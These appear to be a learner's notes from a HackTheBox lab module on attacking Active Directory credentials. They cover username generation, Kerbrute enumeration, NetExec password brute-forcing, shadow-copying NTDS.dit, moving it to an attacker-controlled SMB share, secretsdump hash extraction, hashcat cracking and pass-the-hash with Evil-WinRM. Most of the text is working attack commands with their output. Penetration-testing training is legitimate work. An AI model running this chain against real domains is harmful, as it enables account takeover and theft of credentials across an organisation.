This section, we will focus primarily on how we can extract credentials through the use of a `dictionary attack` against `AD accounts` and `dumping hashes` from the `NTDS.dit` file.

1. Once a Windows system is joined to a domain, it will `no longer default to referencing the SAM database to validate logon requests`
2. That domain-joined system will now send authentication requests to be validated by the domain controller before allowing a user to log on.

## Dictionary attacks against AD accounts using NetExec

|Username convention|Practical example for `Jane Jill Doe`|
|---|---|
|`firstinitiallastname`|jdoe|
|`firstinitialmiddleinitiallastname`|jjdoe|
|`firstnamelastname`|janedoe|
|`firstname.lastname`|jane.doe|
|`lastname.firstname`|doe.jane|
|`nickname`|doedoehacksstuff|

> [!NOTE] A tip from `MrB3n`:
>  We can often find the email structure by Googling the domain name, i.e., "@inlanefreight.com" and get some valid emails. From there, we can use a script to scrape various social media sites and mashup potential valid usernames. Some organizations try to obfuscate their usernames to prevent spraying, so they may alias their username like a907 (or something similar) back to joe.smith. That way, email messages can get through, but the actual internal username isn't disclosed, making password spraying harder. Sometimes you can use google dorks to search for "inlanefreight.com filetype:pdf" and find some valid usernames in the PDF properties if they were generated using a graphics editor. From there, you may be able to discern the username structure and potentially write a small script to create many possible combinations and then spray to see if any come back valid.
#### Creating a custom list of usernames
Let's say we have done our research and gathered a list of names based on publicly available information
Ruby-based tool [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) to convert a list of real names into common username formats.

- Ben Williamson
- Bob Burgerstien
- Jim Stevenson
- Jill Johnson
- Jane Doe

```shell
hakir0x00@htb[/htb]$ ./username-anarchy -i /home/ltnbob/names.txt 

ben
benwilliamson
ben.williamson
benwilli
benwill
benw
b.williamson
bwilliamson
wben
```


#### Enumerating valid usernames with Kerbrute

Kerbrute can be used for brute-forcing, password spraying and username enumeration.

Username Enum with Kerbrute
```shell
shakir0x00@htb[/htb]$ ./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt
```

EVEN BETTER WAY IF USERNAMES LIST IS SHORT

```shell
username-anarchy -i names.txt -f flast | tee usernames                                
jmarston
cjohnson
jstapleton
```

```shell
netexec smb xx.xx.xx.xx -u usernames -p /usr/share/wordlists/fasttrack.txt --continue-on-success --ntds
```


#### Launching a brute-force attack with NetExec

We can use it in conjunction with the SMB protocol to send logon requests to the target Domain Controller. Here is the command to do so:

```shell
shakir0x00@htb[/htb]$ netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```

NetExec is using SMB to attempt to logon as user (`-u`) `bwilliamson` using a password (`-p`) list containing a list of commonly used passwords (`/usr/share/wordlists/fasttrack.txt`

#### Event logs from the attack

## Capturing NTDS.dit

`NT Directory Services` (`NTDS`) is the directory service used with AD to find & organize network resources. Recall that `NTDS.dit` file is stored at `%systemroot%/ntds` on the domain controllers in a [forest](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/using-the-organizational-domain-forest-model). The `.dit` stands for [directory information tree](https://docs.oracle.com/cd/E19901-01/817-7607/dit.html). This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information.

If this file can be captured, we could potentially compromise every account on the domain similar to the technique we covered in this module's `Attacking SAM, SYSTEM, and SECURITY` section.


#### Connecting to a DC with Evil-WinRM

We can connect to a target DC using the credentials we captured.

```shell
shakir0x00@htb[/htb]$ evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```

#### Checking local group membership

Once connected, we can check to see what privileges `bwilliamson` has. We can start with looking at the local group membership using the command:

```powershell
*Evil-WinRM* PS C:\> net localgroup

Aliases for \\DC01

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Account Operators
*Administrators
*Allowed RODC Password Replication Group
*Backup Operators
*Cert Publishers
*Certificate Service DCOM Access
*Cryptographic Operators
*Denied RODC Password Replication Group
*Distributed COM Users
*DnsAdmins
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Incoming Forest Trust Builders
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Pre-Windows 2000 Compatible Access
*Print Operators
*RAS and IAS Servers
*RDS Endpoint Servers

*RDS Remote Access Servers
*Remote Desktop Users
*Remote Management Users
*Replicator
*Server Operators
*Storage Replica Administrators
*Terminal Server License Servers
*Users
*Windows Authorization Access Group
The command completed successfully.
```

We are looking to see if the account has local admin rights. To make a copy of the NTDS.dit file, we need local admin (`Administrators group`) or Domain Admin (`Domain Admins group`) (or equivalent) rights. We also will want to check what domain privileges we have.

#### Checking user account privileges including domain

```shell
*Evil-WinRM* PS C:\> net user bwilliamson

```


This account has both Administrators and Domain Administrator rights which means we can do just about anything we want, including making a copy of the NTDS.dit file.

#### Creating shadow copy of C:

We can use `vssadmin` to create a [Volume Shadow Copy](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) (`VSS`) of the `C:` drive or whatever volume the admin chose when initially installing AD. It is very likely that NTDS will be stored on `C:` as that is the default location selected at install, but it is possible to change the location. We use VSS for this because it is designed to make copies of volumes that may be read & written to actively without needing to bring a particular application or system down. VSS is used by many different backup and disaster recovery software to perform operations.

```shell
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:

vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```

#### Copying NTDS.dit from the VSS

We can then copy the `NTDS.dit` file from the volume shadow copy of `C:` onto another location on the drive to prepare to move NTDS.dit to our attack host.
```shell
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

Before copying `NTDS.dit` to our attack host, we may want to use the technique we learned earlier to create an SMB share on our attack host. Feel free to go back to the `Attacking SAM, SYSTEM, and SECURITY` section to review that method if needed.
> [!NOTE] Note
> As was the case with `SAM`, the hashes stored in `NTDS.dit` are encrypted with a key stored in `SYSTEM`. In order to successfully extract the hashes, one must download both files.

#### Transferring NTDS.dit to attack host

Here we are using the smb share. (**Note for me** : if you forget how to do it check the section 8 of this module)

```shell
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 
```



#### Extracting hashes from NTDS.dit

```shell
shakir0x00@htb[/htb]$ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL

```

#### A faster method: Using NetExec to capture NTDS.dit

```shell
shakir0x00@htb[/htb]$ netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
```

## Cracking hashes and gaining credentials


```shell
shakir0x00@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

`What if we are unsuccessful in cracking a hash?`

## Pass the Hash (PtH) considerations

We can still use hashes to attempt to authenticate with a system using a type of attack called `Pass-the-Hash` (`PtH`). A PtH attack takes advantage of the [NTLM authentication protocol](https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm#:~:text=NTLM%20uses%20an%20encrypted%20challenge,to%20the%20secured%20NTLM%20credentials) to authenticate a user using a password hash. Instead of `username`:`clear-text password` as the format for login, we can instead use `username`:`password hash`. Here is an example of how this would work:

```shell
shakir0x00@htb[/htb]$ evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```
